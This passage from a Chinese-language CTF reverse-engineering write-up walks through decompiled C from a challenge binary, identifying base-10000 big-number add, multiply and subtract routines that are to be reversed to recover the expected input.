sub_7FF7ECAD105A);</span><br><span class="line">    sub_7FF7ECAD119A((__int64)v33);</span><br><span class="line">  &#125;</span><br><span class="line">  v34 = v19;</span><br><span class="line">  <span class="keyword">if</span> ( v19 )</span><br><span class="line">    tmp_string = sub_7FF7ECAD1316((__int64)v34, <span class="number">1</span>i64);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    tmp_string = <span class="number">0</span>i64;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  sub_7FF7ECAD119A((__int64)v17);</span><br><span class="line">  <span class="keyword">return</span> v35;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很考察基本功 能否将一些函数正确符号化便于审代码<br>STRLEN:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF7ECADCEA0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7ECAF604A, a2, a3);</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GET_C_STR:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF7ECADA8E0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7ECAF604A, a2, a3);</span><br><span class="line">  v4 = a1 + <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_7FF7ECAD17C1(a1) )</span><br><span class="line">    <span class="keyword">return</span> sub_7FF7ECAD17FD(*(_QWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点是要识别出if(v26)中的那个STRING_TO_NUM！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">sub_7FF7ECAD6890</span><span class="params">(_DWORD *a1, <span class="type">const</span> <span class="type">char</span> *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+A4h] [rbp+84h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+C4h] [rbp+A4h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7ECAF60F2, a2, a3);</span><br><span class="line">  j_memset(a1, <span class="number">0</span>, <span class="number">0x7D0</span>ui64);</span><br><span class="line">  v7 = j_strlen(a2);</span><br><span class="line">  a1[<span class="number">500</span>] = v7 / <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 % <span class="number">4</span> )</span><br><span class="line">    ++a1[<span class="number">500</span>];</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = v7 - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i -= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v5 = i - <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i - <span class="number">3</span> &lt; <span class="number">0</span> )</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = v5; j &lt;= i; ++j )</span><br><span class="line">      v4 = <span class="number">10</span> * v4 + a2[j] - <span class="number">48</span>;                <span class="comment">// char -&gt; num!!!</span></span><br><span class="line">    a1[v6++] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在sub_7FF7ECAD1433中可以看到有个虚函数表<br>能跳转到关键函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">CALCALCAL</span><span class="params">(__int64 a1, _DWORD *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  v3 = &amp;v78;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">10918</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7ECAF60F2, a2, a3);</span><br><span class="line">  v110 = sub_7FF7ECAD128A((__int64)v90, (__int64)&amp;unk_7FF7ECAEE000, <span class="number">48</span>i64);</span><br><span class="line">  v111 = v110;</span><br><span class="line">  v7 = GET_C_STR(v110, v5, v6);</span><br><span class="line">  STRING_TO_BIGNUM((__int64)v79, v7);</span><br><span class="line">  sub_7FF7ECAD119A(v90, v8, v9);</span><br><span class="line">  v110 = sub_7FF7ECAD128A((__int64)v91, (__int64)&amp;unk_7FF7ECAEE0C0, <span class="number">42</span>i64);</span><br><span class="line">  v111 = v110;</span><br><span class="line">  v12 = GET_C_STR(v110, v10, v11);</span><br><span class="line">  STRING_TO_BIGNUM((__int64)v80, v12);</span><br><span class="line">  sub_7FF7ECAD119A(v91, v13, v14);</span><br><span class="line">  v110 = sub_7FF7ECAD128A((__int64)v92, (__int64)&amp;unk_7FF7ECAEE180, <span class="number">42</span>i64);</span><br><span class="line">  v111 = v110;</span><br><span class="line">  v17 = GET_C_STR(v110, v15, v16);</span><br><span class="line">  STRING_TO_BIGNUM((__int64)v81, v17);</span><br><span class="line">  sub_7FF7ECAD119A(v92, v18, v19);</span><br><span class="line">  v110 = sub_7FF7ECAD128A((__int64)v93, (__int64)&amp;unk_7FF7ECAEE230, <span class="number">36</span>i64);</span><br><span class="line">  v111 = v110;</span><br><span class="line">  v22 = GET_C_STR(v110, v20, v21);</span><br><span class="line">  STRING_TO_BIGNUM((__int64)v82, v22);</span><br><span class="line">  sub_7FF7ECAD119A(v93, v23, v24);</span><br><span class="line">  v110 = sub_7FF7ECAD128A((__int64)v94, (__int64)&amp;unk_7FF7ECAEE2C0, <span class="number">42</span>i64);</span><br><span class="line">  v111 = v110;</span><br><span class="line">  v27 = GET_C_STR(v110, v25, v26);</span><br><span class="line">  STRING_TO_BIGNUM((__int64)v83, v27);</span><br><span class="line">  sub_7FF7ECAD119A(v94, v28, v29);</span><br><span class="line">  v110 = sub_7FF7ECAD128A((__int64)v95, (__int64)&amp;unk_7FF7ECAEE370, <span class="number">36</span>i64);</span><br><span class="line">  v111 = v110;</span><br><span class="line">  v32 = GET_C_STR(v110, v30, v31);</span><br><span class="line">  STRING_TO_BIGNUM((__int64)v84, v32);</span><br><span class="line">  sub_7FF7ECAD119A(v95, v33, v34);</span><br><span class="line">  v110 = sub_7FF7ECAD128A((__int64)v96, (__int64)&amp;unk_7FF7ECAEE400, <span class="number">36</span>i64);</span><br><span class="line">  v111 = v110;</span><br><span class="line">  v37 = GET_C_STR(v110, v35, v36);</span><br><span class="line">  STRING_TO_BIGNUM((__int64)v85, v37);</span><br><span class="line">  sub_7FF7ECAD119A(v96, v38, v39);</span><br><span class="line">  v110 = sub_7FF7ECAD128A((__int64)v97, (__int64)&amp;unk_7FF7ECAEE490, <span class="number">36</span>i64);</span><br><span class="line">  v111 = v110;</span><br><span class="line">  v42 = GET_C_STR(v110, v40, v41);</span><br><span class="line">  STRING_TO_BIGNUM((__int64)v86, v42);</span><br><span class="line">  sub_7FF7ECAD119A(v97, v43, v44);</span><br><span class="line">  v110 = sub_7FF7ECAD128A((__int64)v98, (__int64)&amp;unk_7FF7ECAEE520, <span class="number">42</span>i64);</span><br><span class="line">  v111 = v110;</span><br><span class="line">  v47 = GET_C_STR(v110, v45, v46);</span><br><span class="line">  STRING_TO_BIGNUM((__int64)v87, v47);</span><br><span class="line">  sub_7FF7ECAD119A(v98, v48, v49);</span><br><span class="line">  v110 = sub_7FF7ECAD128A((__int64)v99, (__int64)&amp;unk_7FF7ECAEE5D0, <span class="number">42</span>i64);</span><br><span class="line">  v111 = v110;</span><br><span class="line">  v52 = GET_C_STR(v110, v50, v51);</span><br><span class="line">  STRING_TO_BIGNUM((__int64)v88, v52);</span><br><span class="line">  sub_7FF7ECAD119A(v99, v53, v54);</span><br><span class="line">  STR_COPY_0(v89, (__int64)a2, v55);</span><br><span class="line">  v56 = j_ADD((__int64)v89, (__int64)v100, (__int64)v79);</span><br><span class="line">  STR_COPY(v89, v56, v57);</span><br><span class="line">  v58 = j_MUL((__int64)v89, (__int64)v101, (__int64)v80);</span><br><span class="line">  STR_COPY(v89, v58, v59);</span><br><span class="line">  v60 = SUB((__int64)v89, (__int64)v102, (__int64)v81);</span><br><span class="line">  STR_COPY(v89, v60, v61);</span><br><span class="line">  v62 = j_ADD((__int64)v89, (__int64)v103, (__int64)v82);</span><br><span class="line">  STR_COPY(v89, v62, v63);</span><br><span class="line">  v64 = j_MUL((__int64)v89, (__int64)v104, (__int64)v83);</span><br><span class="line">  STR_COPY(v89, v64, v65);</span><br><span class="line">  v66 = SUB((__int64)v89, (__int64)v105, (__int64)v84);</span><br><span class="line">  STR_COPY(v89, v66, v67);</span><br><span class="line">  v68 = j_ADD((__int64)v89, (__int64)v106, (__int64)v85);</span><br><span class="line">  STR_COPY(v89, v68, v69);</span><br><span class="line">  v70 = SUB((__int64)v89, (__int64)v107, (__int64)v86);</span><br><span class="line">  STR_COPY(v89, v70, v71);</span><br><span class="line">  v72 = j_ADD((__int64)v89, (__int64)v108, (__int64)v87);</span><br><span class="line">  STR_COPY(v89, v72, v73);</span><br><span class="line">  v74 = SUB((__int64)v89, (__int64)v109, (__int64)v88);</span><br><span class="line">  STR_COPY(v89, v74, v75);</span><br><span class="line">  <span class="keyword">return</span> STR_COPY(a2, (__int64)v89, v76);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里通过前面分析得到的SRTING_TO_NUM等函数可以知道这里是以万进制在做大数运算</p><p>ADD</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">ADD</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">500</span>]; <span class="comment">// [rsp+30h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+800h] [rbp+7E0h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+824h] [rbp+804h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+844h] [rbp+824h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+C14h] [rbp+BF4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">530</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7ECAF60F2, a2, a3);</span><br><span class="line">  STR_COPY_0((__int64)v7, a1);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(a3 + <span class="number">2000</span>) &lt;= *(_DWORD *)(a1 + <span class="number">2000</span>) )</span><br><span class="line">    v11 = *(_DWORD *)(a1 + <span class="number">2000</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v11 = *(_DWORD *)(a3 + <span class="number">2000</span>);</span><br><span class="line">  v10 = v11;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v10; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v7[j] += *(_DWORD *)(a3 + <span class="number">4</span>i64 * j);</span><br><span class="line">    <span class="keyword">if</span> ( v7[j] &gt; <span class="number">9999</span> )                         <span class="comment">// 进位</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v7[j + <span class="number">1</span>];</span><br><span class="line">      v7[j] -= <span class="number">10000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v7[v10] )</span><br><span class="line">    v8 = v10 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v8 = v10;</span><br><span class="line">  STR_COPY_0(a2, (__int64)v7);</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MUL:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">MUL</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">500</span>]; <span class="comment">// [rsp+30h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+800h] [rbp+7E0h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+824h] [rbp+804h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+844h] [rbp+824h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+864h] [rbp+844h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+884h] [rbp+864h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+8A4h] [rbp+884h]</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [rsp+C84h] [rbp+C64h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">562</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7ECAF60F2, a2, a3);</span><br><span class="line">  sub_7FF7ECAD14B5((__int64)v7);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; *(_DWORD *)(a1 + <span class="number">2000</span>); ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    v14 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; *(_DWORD *)(a3 + <span class="number">2000</span>); ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = v11 + v7[k + j] + *(_DWORD *)(a3 + <span class="number">4</span>i64 * k) * *(_DWORD *)(a1 + <span class="number">4</span>i64 * j);</span><br><span class="line">      <span class="keyword">if</span> ( v12 &lt;= <span class="number">9999</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = <span class="number">0</span>;</span><br><span class="line">        v7[k + j] = v12;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v13 = v12 % <span class="number">10000</span>;</span><br><span class="line">        v11 = v12 / <span class="number">10000</span>;</span><br><span class="line">        v7[k + j] = v12 % <span class="number">10000</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v14 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">      v7[k + j] = v11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( m = k + j; !v7[m - <span class="number">1</span>] &amp;&amp; m &gt; <span class="number">1</span>; --m )</span><br><span class="line">    ;</span><br><span class="line">  STR_COPY_0(a2, (__int64)v7);</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SUB:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF7ECAD8500</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line">  <span class="type">int</span> v11[<span class="number">500</span>]; <span class="comment">// [rsp+B0h] [rbp+90h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+880h] [rbp+860h]</span></span><br><span class="line">  <span class="type">int</span> v13[<span class="number">890</span>]; <span class="comment">// [rsp+8B0h] [rbp+890h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1058</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="number">-858993460</span>;</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(&amp;unk_7FF7ECAF60F2, a2, a3);</span><br><span class="line">  sub_7FF7ECAD14B5((__int64)v11);</span><br><span class="line">  sub_7FF7ECAD14B5((__int64)v13);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_7FF7ECAD140B(a1, a3) )</span><br><span class="line">  &#123;</span><br><span class="line">    STR_COPY((__int64)v11, a1);</span><br><span class="line">    STR_COPY((__int64)v13, a3);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    STR_COPY((__int64)v11, a3);</span><br><span class="line">    STR_COPY((__int64)v13, a1);</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = v12;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v9; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v11[j] &gt;= v13[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      v11[j] -= v13[j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = j + <span class="number">1</span>; !v11[k]; ++k )</span><br><span class="line">        ;</span><br><span class="line">      --v11[k--];</span><br><span class="line">      <span class="keyword">while</span> ( k &gt; j )</span><br><span class="line">        v11[k--] += <span class="number">9999</span>;</span><br><span class="line">      v11[j] += <span class="number">10000</span> - v13[j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = v9;</span><br><span class="line">  <span class="keyword">while</span> ( !v11[v12 - <span class="number">1</span>] &amp;&amp; v12 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    --v12;</span><br><span class="line">    --v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    v11[v9 - <span class="number">1</span>] = -v11[v9 - <span class="number">1</span>];</span><br><span class="line">  STR_COPY_0(a2, (__int64)v11);</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>符号化函数后会发现92行又调用了SUB 而且参数是v19和v21<br>结合后面紧跟着的sub_7FF7ECAD1014函数发现是一个check函数 检查值是否为0<br>那么前面的SUB的值就是我们想要的最终值<br>最后动调把需要的大整数值全部提取出来 按照初始 <code>+*-+*-+*-+-+-</code> 的逆序逆回去<br>就能得到inputbase64处理后的值<br>注意到最后check处 v20-&gt;tmp_string-&gt;v18 找到v18出现的地方 <code> sub_7FF7ECAD1244(v18, tmp_string);</code><br>查看这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_7FF7ECADBC50</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">2036</span>]; <span class="comment">// [rsp+30h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11[<span class="number">11</span>]; <span class="comment">// [rsp+824h] [rbp+804h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span 